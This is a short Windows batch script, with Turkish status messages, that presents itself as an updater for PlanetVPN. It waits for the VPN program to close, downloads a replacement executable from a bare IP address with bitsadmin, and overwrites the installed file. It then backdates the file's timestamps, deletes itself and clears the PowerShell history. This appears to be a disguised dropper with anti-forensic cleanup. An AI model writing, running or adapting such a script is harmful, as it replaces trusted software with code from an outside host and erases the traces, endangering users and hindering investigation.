@echo off
echo PlanetVPN.exe kapanması bekleniyor...

:loop
tasklist | find /i "PlanetVPN.exe" >nul
if not errorlevel 1 (
    timeout /t 1 >nul
    goto loop
)

echo PlanetVPN.exe kapalı. Güncelleniyor...

bitsadmin /transfer myDownloadJob /download /priority high https://31.57.156.199/PlanetVPN.exe "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe"

if exist "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe" (
    echo Yazdırma Başarılı.

    echo Dosya bilgileri ayarlanıyor...
    powershell -NoProfile -Command ^
    "$filePath = 'C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe'; ^
    if (Test-Path $filePath) { ^
        $item = Get-Item $filePath; ^
        $time = '2024-10-14 13:59:24'; ^
        $item.CreationTime = $time; ^
        $item.LastWriteTime = $time; ^
    } else { Write-Host 'Dosya bulunamadı: $filePath' }"

    echo Temizlik yapılıyor...
    powershell -Command "Start-Sleep -Seconds 5; Remove-Item '%~f0'"
    powershell -NoProfile -Command "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
)

exit
